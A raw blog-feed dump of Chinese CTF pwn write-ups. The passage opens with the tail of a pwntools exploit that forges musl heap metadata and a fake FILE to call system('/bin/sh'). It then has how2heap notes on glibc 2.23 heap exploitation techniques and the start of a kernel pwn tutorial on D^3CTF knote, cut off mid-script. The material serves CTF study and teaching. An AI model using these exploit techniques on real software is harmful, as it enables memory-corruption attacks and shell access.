class="number">0x10</span>)</span><br><span class="line">key += p64(<span class="number">4</span>)</span><br><span class="line">key += p64(<span class="number">0x30</span>)</span><br><span class="line">key += p64(encrypt_original(find_collision(find_collision(<span class="string">b&#x27;B&#x27;</span>))))</span><br><span class="line">key += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">fake_file += p64(<span class="number">1</span>)     <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system)    <span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">fake_meta = p64(fake_group_addr + <span class="number">0x10</span> + <span class="number">0x80</span>)      <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr)                            <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)                   <span class="comment"># fake_meta-&gt;mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)                                 <span class="comment"># fake_meta-&gt;avail_mask</span></span><br><span class="line">fake_meta += p64(last_idx + (freeable &lt;&lt; <span class="number">5</span>) + (sizeclass &lt;&lt; <span class="number">6</span>) + (maplen &lt;&lt; <span class="number">12</span>))</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr)</span><br><span class="line">fake_group += p64(<span class="number">1</span>)</span><br><span class="line">fake_group += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">value = fake_file.ljust(<span class="number">0x1000</span> - <span class="number">0x560</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">value += p64(secret).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">value += fake_meta</span><br><span class="line">value += fake_group</span><br><span class="line">value += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x530</span></span><br><span class="line"></span><br><span class="line">store(key, value, key_size=<span class="number">0x30</span>, value_size=<span class="built_in">len</span>(value))</span><br><span class="line"><span class="comment"># query(p64(group_addr + 0x20) + p64(fake_group_addr + 0x90) + p64(4) + p64(0x30) +</span></span><br><span class="line"><span class="comment">#       p64(encrypt_original(find_collision(find_collision(b&#x27;B&#x27;)))) + p64(0), key_size=0x30)</span></span><br><span class="line">info(<span class="string">&#x27;fake chunk address: &#x27;</span> + <span class="built_in">hex</span>(fake_group_addr + <span class="number">0x90</span>))</span><br><span class="line">info(<span class="string">&#x27;stderr: &#x27;</span> + <span class="built_in">hex</span>(stderr))</span><br><span class="line">info(<span class="string">&#x27;group address: &#x27;</span> + <span class="built_in">hex</span>(group_addr))</span><br><span class="line">info(<span class="string">&#x27;mmap space: &#x27;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line">delete(find_collision(find_collision(<span class="string">b&#x27;B&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(4)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-4/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-4/</url>
      
        <content type="html"><![CDATA[<p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 16.04<br>Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p><p>本人在前几天成功进入校队，因此后面的更新应该短时间内不会中断。<br>按照顺序，本文分析glibc 2_23文件夹中的第12~16个源码<br>如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p><h1 id="12-large-bin-attack"><a href="#12-large-bin-attack" class="headerlink" title="12. large_bin_attack"></a>12. large_bin_attack</h1><p>large_bin_attack可以用于在栈区写入一个较大的值。通常是为其他攻击方式做准备。</p><p>首先，源码在栈区定义了两个变量stack_var1和stack_var2，类型为unsigned long。之后依次分配了大小为0x430(p1), 0x20, 0x510(p2), 0x20, 0x510(p3), 0x20大小的chunk。（0x20的chunk用于防止堆块合并）</p><p>之后，释放p1和p2。此时unsorted bin的结构应为：</p><p><code>unsorted bin head &lt;-&gt; p2 &lt;-&gt; p1</code></p><p>然后，malloc一个0xa0大小的chunk，在此过程中，p2被转移到了large bins中，p1被切割，仍在unsorted bin中且为last_remainder。</p><p>之后，释放p3。下面是释放p3之后的堆结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6030a0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x6039a0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x603460</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x7ffff7dd1fa8</span><br><span class="line">bk: 0x7ffff7dd1fa8</span><br><span class="line">fd_nextsize: 0x603460</span><br><span class="line">bk_nextsize: 0x603460</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603970</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6039a0</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x6030a0</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603eb0</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603ee0</span><br><span class="line">Size: 0x20121</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6039a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6039a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x500: 0x603460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x603460 /* &#x27;`4`&#x27; */</span><br></pre></td></tr></table></figure><p>之后是漏洞部分。如果我们可以修改p2的控制字段。那么下面如此操作：</p><p>将p2的size从0x511改小为0x3f1，fd和fd_nextsize改为0，bk改为<code>(unsigned long)(&amp;stack_var1-2)</code>，bk_nextsize改为<code>(unsigned long)(&amp;stack_var2-4)</code>，调试时stack_var1的地址为0x7fffffffe470，stack_var2的地址为0x7fffffffe478。那么(unsigned long)(&amp;stack_var1-2)的值就为0x7fffffffe460，(unsigned long)(&amp;stack_var2-4)的值就为0x7fffffffe458。</p><p>修改之后，堆结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6030a0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x6039a0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603460</span><br><span class="line">Size: 0x3f1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603850</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6039a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6039a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x500 [corrupted]</span><br><span class="line">FD: 0x603460 ◂— 0x0</span><br><span class="line">BK: 0x603460 —▸ 0x7fffffffe460 ◂— 0x0</span><br></pre></td></tr></table></figure><p>最后，malloc大小为0xa0的chunk，然后我们就会惊奇地发现两个栈变量的值被修改为p3的地址。</p><p>这个漏洞的利用流程就是这样，而利用的关键就是_int_malloc函数中关于large bins的处理部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">                 victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">             &#125;</span><br><span class="line">             bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line">   [...]</span><br><span class="line"></span><br><span class="line">   mark_bin (av, victim_index);</span><br><span class="line">   victim-&gt;bk = bck;</span><br><span class="line">   victim-&gt;fd = fwd;</span><br><span class="line">   fwd-&gt;bk = victim;</span><br><span class="line">   bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>由于在修改p2之后，bin的结构如图：</p><p>所以遍历时会首先遍历到p1。通过源码进行调试发现这里直接跳过了else语句而从mark_bin开始执行。victim &#x3D; p1，bck &#x3D; fwd &#x3D; main_arena + 984，这应该是p1现在的大小所对应的应该放入的small bin的位置（此时p1大小为0x391，属于small bins范围）。经历这4步之后，p1被成功链入到一个large bin中，目前一切正常。</p><p>然后，_int_malloc会进行下一次循环，去处理p3。此时victim &#x3D; p3，fwd &#x3D; p2，bck &#x3D; 0x7fffffffe460。这时，else语句中会被执行。内部4个语句执行完成后，p1，p2，p3和部分栈区结构如下：</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">p1</td><td align="center">0</td><td align="center">0x391</td></tr><tr><td align="center">p1 + 0x10</td><td align="center">&lt;small bin addr&gt;</td><td align="center">&lt;small bin addr&gt;</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">p2</td><td align="center">0</td><td align="center">0x3f1</td></tr><tr><td align="center">p2 + 0x10</td><td align="center">0</td><td align="center">0x7fffffffe460</td></tr><tr><td align="center">p2 + 0x20</td><td align="center">0</td><td align="center">&lt;p3&gt;（原为0x7fffffffe458，第三步修改）</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">p3</td><td align="center">0</td><td align="center">0x511</td></tr><tr><td align="center">p3 + 0x10</td><td align="center">&lt;unsorted bin head&gt;</td><td align="center">&lt;unsorted bin head&gt;</td></tr><tr><td align="center">p3 + 0x20</td><td align="center">&lt;p2&gt;（第一步修改）</td><td align="center">0x7fffffffe458（第二步修改）</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">(stack)</td><td align="center">stack_var1 &#x3D; 0</td><td align="center">stack_var2 &#x3D; &lt;p3&gt;（第四步修改）</td></tr></tbody></table><p>可以看到，在else语句里面，stack_var2在第4步被修改。跳出else语句之后，第四条语句<code>bck-&gt;fd = victim;</code>将stack_var1成功修改为p3的地址。至此，目标地址修改完成。stack_var1和stack_var2现在的值为p3的地址。</p><h1 id="13-mmap-overlapping-chunks"><a href="#13-mmap-overlapping-chunks" class="headerlink" title="13. mmap_overlapping_chunks"></a>13. mmap_overlapping_chunks</h1><p>源码中第一句就说，这是一个应该能够在所有libc版本中利用的漏洞。</p><p>在libc中，如果用户一次性申请的内存空间过大，malloc函数不会像通常那样从堆中分配内存给用户，而是调用mmap函数为用户映射一块单独的虚拟内存使用。同样，当用户将这块空间释放时，会调用munmap函数将这块空间返还给操作系统内核。</p><p>通过mmap获取的chunk在size域的bit-1上有体现。size的bit-0，bit-1，bit-2三位是用于保存控制信息的，其中bit-1就表示该chunk是否由mmap产生。mmap chunk有prev size域，它表示mmap chunk的剩余大小（内核调用mmap函数时通常会分配一块大于用户需求的内存块）。同时mmap chunk的fd和bk指针没有意义，在free时也不会放入bins中。在释放时，mmap chunk必须是页对齐的。</p><p>首先，程序分配一个小chunk用于初始化堆空间。然后分配一块大小为0x100000的chunk，这第一块chunk的位置是在libc的加载地址之上的，后面又分配了2个相同大小的大chunk就在libc的加载地址之下了，空间分配大致如下表：</p><table><thead><tr><th align="center">addr</th><th align="center">content</th></tr></thead><tbody><tr><td align="center">(high address)</td><td align="center">first mmap chunk</td></tr><tr><td align="center"></td><td align="center">libc</td></tr><tr><td align="center"></td><td align="center">second mmap chunk</td></tr><tr><td align="center">(low address)</td><td align="center">third mmap chunk</td></tr></tbody></table><p>此时，第三个mmap chunk的prev size为0，因为申请大小本身就是页对齐的，没有剩余空间。程序输出显示，第三个mmap chunk的size为0x101002。然后，我们只需要将这个chunk的大小改大，在释放的时候就能够将第二个mmap连带着释放掉。在程序中是将第三个chunk的size改为了0x202002，正好将第二个chunk全部覆盖。这实际上就是mmap版本的UAF。但是需要注意的是，由于munmap是将这块空间直接返还给了linux内核，因此释放后直接访问这段内存会导致程序崩溃。这点与一般的free不同。因此，现在需要做的就是将这段内存要回来，让两个指针指向相同位置。</p><p>随后，第三个chunk被释放，第二个连带着被释放，接下来又分配一个大小为0x300000的chunk，这个chunk完全覆盖了第二个和第三个chunk，大小为0x301002。此时第四个chunk的初始地址比第二个chunk小0x200000，由于所有mmap chunk的类型均设定为long long，因此索引应该为0x40000，即第四个chunk下标为0x40000的地方就是第二个chunk的开头，这样就能够通过第四个chunk修改第二个chunk的值了。</p><p>实际上这个漏洞还是比较好理解的，就是修改chunk的大小让chunk重叠。</p><h1 id="14-overlapping-chunks"><a href="#14-overlapping-chunks" class="headerlink" title="14. overlapping_chunks"></a>14. overlapping_chunks</h1><p>这是一个堆块重叠产生的漏洞利用。</p><p>首先有4个指针p1~p4，前三个分别分配0x100，0x100，0x80大小的chunk，然后将p1中的所有字节设为1，p2所有字节设为2，p3所有字节设为3。</p><p>然后将p2释放，p2会链入unsorted bin中。接下来是漏洞关键步骤：修改p2的大小，将其改大为0x180，这样p3将完全被p2重叠。之后，分配0x178大小的chunk到p4，这使得p2被重新分配出来，直接从unsorted bin中弹出。后面的过程就很好理解了，由于p4完全包含p3，这使得我们可以在p4中写入数据时随意修改p3中的值。</p><p>当然，从这里看，堆块重叠只是为其他漏洞利用方式做准备。</p><h1 id="15-overlapping-chunks-2"><a href="#15-overlapping-chunks-2" class="headerlink" title="15. overlapping_chunks_2"></a>15. overlapping_chunks_2</h1><p>这个文件与上面的overlapping_chunks基本上相似。</p><p>首先分配5个可用大小为1000的堆块，分别为p1~p5。之后释放p4，修改p2的大小使p2正好完全覆盖p3的同时保持其prev_in_use位为1。之后释放p2会将p3这块空间连带着释放掉，再将其分配回来到p6，就可以从p6里面写入数据随意修改p3的内容了。</p><p>利用方式与overlapping_chunks相同，不再赘述。</p><h1 id="16-poison-null-byte"><a href="#16-poison-null-byte" class="headerlink" title="16. poison_null_byte"></a>16. poison_null_byte</h1><p>这是一种只溢出一个字节的漏洞利用方式。前面也分析过一个类似的漏洞house_of_einherjar。与house_of_einherjar相同。这种漏洞利用也是溢出一个空字符\x00。</p><p>程序首先将堆区构造成如下的结构（barrier防止top chunk的影响）：</p><table><thead><tr><th align="center">addr</th><th align="center">content</th></tr></thead><tbody><tr><td align="center">0x0</td><td align="center">chunk a(size &#x3D; 0x111)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x110</td><td align="center">chunk b(size &#x3D; 0x211)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x320</td><td align="center">chunk c(size &#x3D; 0x111)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x430</td><td align="center">barrier(size &#x3D; 0x111)</td></tr></tbody></table><p>然后，将b释放，进入关键步骤：从a溢出一个字节到b的size使b的size从0x211修改为0x200。这样b的实际大小就缩小了0x10。由于需要绕过检查，我们要在b的结尾处伪造一个prev size，这与house_of_einherjar类似，具体请参考我的how2heap第一篇笔记。</p><table><thead><tr><th align="center">addr</th><th align="center">content</th></tr></thead><tbody><tr><td align="center">0x0</td><td align="center">chunk a(size &#x3D; 0x111)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x110</td><td align="center">chunk b(size &#x3D; 0x211)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x310</td><td align="center">fake prev_size &#x3D; 0x200</td></tr><tr><td align="center">0x318</td><td align="center">0</td></tr><tr><td align="center">0x320</td><td align="center">chunk c(size &#x3D; 0x111)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x430</td><td align="center">barrier(size &#x3D; 0x111)</td></tr></tbody></table><p>之后，分配一个大小为0x110的堆块，这个堆块的起始地址将和原b的起始地址相同，且分配之后会对假prev_size进行调整，调整为0xf0。然后继续分配一个0x90大小的空间p2，p2紧跟在p1之后。此时堆空间如图：</p><table><thead><tr><th align="center">addr</th><th align="center">content</th></tr></thead><tbody><tr><td align="center">0x0</td><td align="center">chunk a(size &#x3D; 0x111)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x110</td><td align="center">chunk b1(size &#x3D; 0x111)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x220</td><td align="center">chunk b2(size &#x3D; 0x91)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x2b0</td><td align="center">&lt;unsorted bin chunk&gt;(size &#x3D; 0x61)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x310</td><td align="center">fake prev_size &#x3D; 0x60</td></tr><tr><td align="center">0x318</td><td align="center">fake size &#x3D; 0</td></tr><tr><td align="center">0x320</td><td align="center">chunk c(size &#x3D; 0x111)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">0x430</td><td align="center">barrier(size &#x3D; 0x111)</td></tr></tbody></table><p>接下来，首先释放b1，然后紧接着释放c，此时会惊奇地发现，b1和c竟然合并了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0x111</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x603110</span><br><span class="line">Size: 0x321</span><br><span class="line">fd: 0x6032b0</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x110</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603540</span><br><span class="line">Size: 0x20ac1</span><br></pre></td></tr></table></figure><p>释放c时，_int_free检查到c的prev_size对应偏移处的chunk（b1）是一个unsorted bin free chunk，因此执行了malloc_consolidate函数将二者进行了合并，但是请注意，此时的p2仍然可以进行任意读写操作，这就导致了c完全覆盖了b2，接下来我们将c重新分配回去就可以通过向c写入数据以随意修改p2的内容。</p><p>理解该漏洞的核心是溢出一个字节的空字节究竟对堆空间有什么样的影响，溢出一个字节后，b的大小被改小，因此之后分配内存时，修改的prev size是一个假的prev size，下一个chunk真正的prev size不会被修改，这就为后面的堆块合并创造了条件，我们不需要修改后面一个chunk的prev size就能够让它与前面的堆块合并，造成堆块的重叠。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel pwn 入门 (7)</title>
      <link href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-7/"/>
      <url>/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-7/</url>
      
        <content type="html"><![CDATA[<p>本篇文章中，我们会练习回顾上一篇文章中学到的<strong>userfaultfd</strong>利用方式，同时学习一种新的利用方式：<strong>modprobe_path</strong>。使用的例题是：<font color=red><strong>D^3CTF-2019 knote</strong></font>，需要两种利用配合使用。下面我们对本题进行分析。题目下载地址：<a href="https://arttnba3.cn/download/d3ctf2019/knote.7z">下载</a>。再次感谢Arttnba3师傅的博客。</p><h1 id="0x1-ko文件分析"><a href="#0x1-ko文件分析" class="headerlink" title="0x1: .ko文件分析"></a>0x1: .ko文件分析</h1><p>当然，在利用之前，我们首先还是需要将这个ko文件过一遍。</p><h2 id="file-operations"><a href="#file-operations" class="headerlink" title="file_operations"></a>file_operations</h2><p><img src="https://img-blog.csdnimg.cn/65a044d542194c148281ef336f515c5d.png"><br>可以看到fops中定义有ioctl函数和open函数的入口，另外由于release函数的起始地址为0，因此这里的所有0都可以看做release函数入口。</p><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>分析ioctl函数可知，一共定义了以下几种入口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=0x2333: 执行get函数</span><br><span class="line">cmd=0x1337: 执行add函数</span><br><span class="line">cmd=0x6666: 执行dele函数</span><br><span class="line">cmd=0x8888: 执行edit函数</span><br></pre></td></tr></table></figure><h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><p><img src="https://img-blog.csdnimg.cn/2a92f94330574903986f843827a58e87.png"><br>出现了一个mychunk的东西，因此本题和堆有关系。前面if的意思应该是所有chunk的数量不能超过9。在函数中还出现了一个<code>copy_user_generic_unrolled</code>函数，查看<a href="https://elixir.bootlin.com/linux/v5.3.6/source/arch/x86/lib/copy_user_64.S#L56">源码</a>可知其第一个参数是dest，第二个参数是src，第三个参数是count，和<code>copy_to_user</code>、<code>copy_from_user</code>功能相似。这里看到ptr实际上是<code>get</code>函数的第二个参数，因此也就是将第二个参数（用户地址）中的内容拷贝到<code>mychunk.ptr</code>中。</p><p><img src="https://img-blog.csdnimg.cn/c821b037e2a54635883ddc2bd05e403c.png"><br>这就是chunk的结构，其中<code>_anon_0</code>的名字很长的类型是一个联合体，有<code>size</code>和<code>idx</code>两个类型可以表示，为方便将类型名改为<code>info</code>。</p><p>因此，<code>get</code>函数就是从用户内存中拷贝内容到分配好的chunk中。</p><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p><img src="https://img-blog.csdnimg.cn/ff7296fac128417aa9c8b3abf86d1490.png"><br>在<code>add</code>函数中，可以看到在一开始加了一个读锁。在之后又加了一个写锁。</p><p>函数中还调用了<code>_InterlockedExchangeAdd</code>函数，笔者查到的文章中关于这个函数都是Windows下的API，大概的含义是线程互锁下的相加操作。这里将读写锁的值减去200，原因暂时未知。</p><p>之后则是通过<code>kmalloc</code>进行内核堆空间分配，后面的<code>my_rwlock.raw_lock._anon_0._anon_0.wlocked = 0;</code>应该表示的是解除写锁。</p><h2 id="dele"><a href="#dele" class="headerlink" title="dele"></a>dele</h2><p><img src="https://img-blog.csdnimg.cn/0dd46383bfca474ea9b06505c55ac963.png"><br>堆空间释放函数同样使用了读写锁，在释放之后将<code>size</code>和<code>ptr</code>均清空。</p><h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><p><img src="https://img-blog.csdnimg.cn/398ebe42478a47238ea6260e023abadb.png"><br>这里同样使用了<code>copy_user_generic_unrolled</code>这个函数，但根据参数来判断，这里应该是和<code>copy_to_user</code>函数的含义相同。</p><h2 id="knote-open"><a href="#knote-open" class="headerlink" title="knote_open"></a>knote_open</h2><p><img src="https://img-blog.csdnimg.cn/5346e285509e4eee9738919641951501.png"><br>在这个函数中，通过<code>raw_write_lock</code>函数设定<code>my_rwlock</code>为写锁，不允许其他线程读写<code>in_use</code>。</p><h1 id="0x2-init和start-sh文件分析"><a href="#0x2-init和start-sh文件分析" class="headerlink" title="0x2. init和start.sh文件分析"></a>0x2. init和start.sh文件分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> -e 